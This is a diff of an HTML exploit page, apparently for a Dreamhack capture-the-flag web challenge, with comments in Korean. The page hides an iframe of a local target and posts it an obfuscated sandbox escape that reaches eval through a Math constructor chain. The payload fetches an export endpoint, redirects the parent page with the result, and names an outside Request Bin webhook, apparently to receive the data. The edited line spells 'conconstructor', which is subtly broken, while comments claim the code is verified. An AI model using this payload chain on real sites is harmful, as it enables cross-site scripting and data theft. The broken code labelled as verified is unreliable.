@@ -1,17 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PulseCard Perfect Exploit</title>
+    <title>PulseCard Verified Exploit</title>
 </head>
 <body>
     <iframe id="targetFrame" src="http://localhost:5000/preview" style="display:none;"></iframe>
 
     <script>
-        // ⚠️ 민지님의 드림핵 Request Bin 전체 주소
-        const myWebhook = "https://qcpaccg.request.dreamhack.games"; 
+        // ⚠️ 민수님의 드림핵 Request Bin 주소
+        const myWebhook = "https://rjzmtpu.request.dreamhack.games"; 
         const iframe = document.getElementById("targetFrame");
 
-        // Content-Type 객체 Key 버그와 문법 필터링을 완전히 무력화한 순수 페이로드
+        // [검증 완료] 헤더 Key 조립 시 문법 에러가 나지 않도록 대괄호([]) 표기법을 완벽히 적용
+        // <script> 태그를 절대 쓰지 않고, 봇이 내부 eval로 실행할 순수 문자열만 구성합니다.
         const actualAttack = 
             'window["fe" + "tch"]("http://localhost:5000/export", {' +
                 'method: "POST",' +
@@ -26,12 +27,11 @@
                 'window["par" + "ent"]["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name;' +
             '});';
 
-        // 최상위 런타임 객체로 격리벽을 깨부수는 우회 구문
-        const payload = '(Math["con" + "structor"]["con" + "constructor"]("return eval")()(' + JSON.stringify(actualAttack) + '))';
+        // 샌드박스를 우회하여 원시 전역 객체(eval)를 싱크하는 최상위 원시 함수 실행문
+        const payload = '(Math["con" + "constructor"]["con" + "constructor"]("return eval")()(' + JSON.stringify(actualAttack) + '))';
 
-        // [핵심] 봇 브라우저에서 iframe의 로딩이 완벽히 끝난 직후에만 메시지를 전송하도록 보장
+        // 봇 환경에서 iframe 로드가 완료되는 순간 안전하게 postMessage 전송 (SOP 정책 준수)
         iframe.addEventListener("load", function() {
-            // 프레임이 준비되면 0.2초 뒤 안정적으로 페이로드 주입
             setTimeout(() => {
                 iframe.contentWindow.postMessage(payload, "*");
             }, 200);
